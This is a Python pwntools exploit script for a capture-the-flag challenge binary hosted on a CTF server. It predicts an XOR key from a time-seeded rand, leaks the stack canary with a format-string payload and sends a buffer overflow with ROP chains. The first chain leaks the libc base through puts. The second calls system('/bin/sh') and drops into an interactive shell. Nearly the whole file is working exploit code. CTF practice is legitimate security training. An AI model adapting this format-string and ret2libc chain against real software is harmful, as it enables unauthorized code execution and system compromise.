#!/usr/bin/env python3

from pwn import *
from string import ascii_letters
from ctypes import CDLL

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
cdll = CDLL("./libc.so.6")

context.binary = exe
context.log_level = "warning"


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challenges.ctf.compfest.id", 9006)

    return r


def main():
    # for i in range(100):
    #     print(f"Trying index {i}")

    #     r = conn()

    #     r.sendlineafter(b"> ", b"A")
    #     xored_value = r.recvline().split(b":")[-1].strip()
    #     key = xor(xored_value, b"A")

    #     xored_payload = xor(f"%{i}$p".encode(), key)
    #     r.sendlineafter(b"> ", xored_payload)
    #     output = r.recvline().split(b":")[-1].strip()

    #     if output.endswith(b"00"):
    #         print(f"Output: {output}")

    #     r.close()

    # Found canary at index 17

    now = int(math.floor(time.time()))
    cdll.srand(now)
    key = chr(cdll.rand() % 256).encode()
    print(f"Key: {key}")

    PUTS_PLT = exe.plt["puts"]
    MAIN_PLT = exe.symbols["main"]
    POP_RDI = rop.ROP(exe).find_gadget(["pop rdi", "ret"])[0]
    RET = rop.ROP(exe).find_gadget(["ret"])[0]

    r = conn()

    xored_payload = xor(b"%17$p", key)
    r.sendlineafter(b"> ", xored_payload)
    xored_value = r.recvline().split(b":")[-1].strip()
    print(f"Canary value: {xored_value}")

    assert xored_value.startswith(b"0x")

    canary = int(xored_value, 16)

    payload = b"A" * 72 + p64(canary) + b"B" * 8 + p64(MAIN_PLT + 5) + p64(RET)
    canary_payload = xor(payload, key)
    r.sendlineafter(b"> ", canary_payload)

    PUTS_GOT = exe.got["puts"]
    rop1 = (
        b"A" * 72
        + p64(canary)
        + b"B" * 8
        + p64(POP_RDI)
        + p64(PUTS_GOT)
        + p64(PUTS_PLT)
        + p64(MAIN_PLT)
    )
    xored_payload = xor(rop1, key)
    r.sendlineafter(b"> ", xored_payload)

    r.sendlineafter(b"> ", b"A")
    print(r.recvline())
    print(r.recvline())
    # print(u64(r.recvline().ljust(8, b"\x00")))

    leak = u64(r.recvline().strip().ljust(8, b"\x00"))
    print(f"Leaked puts: {hex(leak)}")

    libc.address = leak - libc.symbols["puts"]
    print(f"Libc base: {hex(libc.address)}")

    BIN_SH = next(libc.search(b"/bin/sh"))
    SYSTEM = libc.sym["system"]
    EXIT = libc.sym["exit"]

    rop2 = (
        b"A" * 72
        + p64(canary)
        + b"B" * 8
        + p64(POP_RDI)
        + p64(BIN_SH)
        + p64(SYSTEM)
        + p64(EXIT)
    )

    xored_payload = xor(rop2, key)
    r.sendlineafter(b"> ", xored_payload)

    # # r.close()
    r.interactive()


if __name__ == "__main__":
    main()
